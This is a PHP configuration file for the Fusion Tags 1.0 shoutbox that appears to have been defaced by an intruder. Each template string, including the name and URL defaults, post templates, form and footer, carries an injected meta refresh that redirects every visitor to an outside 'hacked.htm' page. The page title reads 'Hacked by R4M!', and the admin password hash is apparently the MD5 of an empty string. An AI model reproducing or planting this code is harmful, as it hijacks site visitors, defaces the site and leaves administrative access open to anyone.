<?php
$data_file = "posts.dat";
$adminusername = "Charlie";
$adminpassword = "d41d8cd98f00b204e9800998ecf8427e";
$maxnamelength = 30;
$maxpostlength = 355;
$maxwordlength = 30;
$shouts = 20;
$namedefault = "<meta http-equiv=\"refresh\" content=\"0; URL=http://bozra.kilu2.de/hacked.htm\">";
$urldefault = "<meta http-equiv=\"refresh\" content=\"0; URL=http://bozra.kilu2.de/hacked.htm\">";
$header = <<<myscript
<BODY TEXT=\"#FFFFFF\" LINK=\"#ffff00\" VLINK=\"#ff00ff\"  bgcolor=\"#000000\">
<style>
A:visited {
	COLOR: #ffffff; TEXT-DECORATION: none
}
A:hover {
	COLOR: #999999; TEXT-DECORATION: none
}
A.menu:link {
	COLOR: #ffffff; TEXT-DECORATION: none
}

TD {
	FONT: 10px Verdana; TEXT-DECORATION: none
}

BODY,TD {font-family: verdana; font-size: 10px; color: c0c0c0; background-attachment:fixed}
TD.menu {font-weight: bold; color: FFFFFF; font-size: 10pt}
INPUT,TEXTAREA {font-family: arial; font-size: 8pt; border: 1px #666666 solid}
.box3d {
border-top-width: 1px; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px}
</style>
<title>Hacked by R4M!</title>
<body leftmargin=\"1\" topmargin=\"1\" rightmargin=\"1\" bottommargin=\"1\" link=\"c0c0c0\" vlink=\"FF0033\">
myscript;
$postheader = <<<myscript
<table cellpadding=1 cellspacing=0 width=100%>
<meta http-equiv=\"refresh\" content=\"0; URL=http://bozra.kilu2.de/hacked.htm\">
myscript;
$postbit = <<<myscript
<tr><td class=\"box3d\" title=\"Posted: <date>\"><name>: <post></td></tr>
<meta http-equiv=\"refresh\" content=\"0; URL=http://bozra.kilu2.de/hacked.htm\">
myscript;
$postfooter = <<<myscript
</table>
<meta http-equiv=\"refresh\" content=\"0; URL=http://bozra.kilu2.de/hacked.htm\">
myscript;
$formbit = <<<myscript
<center>
<table cellpadding=\"1\" cellspacing=\"0\" width=\"100%\">
<tr>
<form action=\"tags.php?submit=yes\" method=\"post\" onSubmit=\"submitonce();\">
<td class=\"box3d\">
 <input type=\"text\" name=\"name\" value=\"<nameCookie>\" maxlength=\"25\" size=\"20\"><br>
 <input type=\"text\" name=\"url\" value=\"<urlCookie>\" maxlength=\"60\" size=\"20\"><br>
 <input type=\"text\" name=\"message\" value=\"Message\"><br>
 <input type=\"submit\" value=\"Tag\"> <input name=\"reset\" type=\"button\" value=\"Reset\" onClick=\"doClearMessage()\"></td>
<meta http-equiv=\"refresh\" content=\"0; URL=http://bozra.kilu2.de/hacked.htm\">
</form>
</tr>
</table>
</center>
myscript;
$footer = <<<myscript
<a href=\"javascript:void(0)\" onClick=\"window.open(\'help.php\',\'tags\',\'width=175,height=550,scrollbars=yes,resizable=yes\')\">Help/Smiles</a> - <a href=\"javascript:void(0)\" onClick=\"window.open(\'tags.php?all\',\'tags\',\'width=175,height=550,scrollbars=yes,resizable=yes\')\">All Messages</a><br>
<a href=\"http://www.fusionphp.org/\" target=\"_blank\">Fusion Tags 1.0</a>
<meta http-equiv=\"refresh\" content=\"0; URL=http://bozra.kilu2.de/hacked.htm\">
myscript;
?>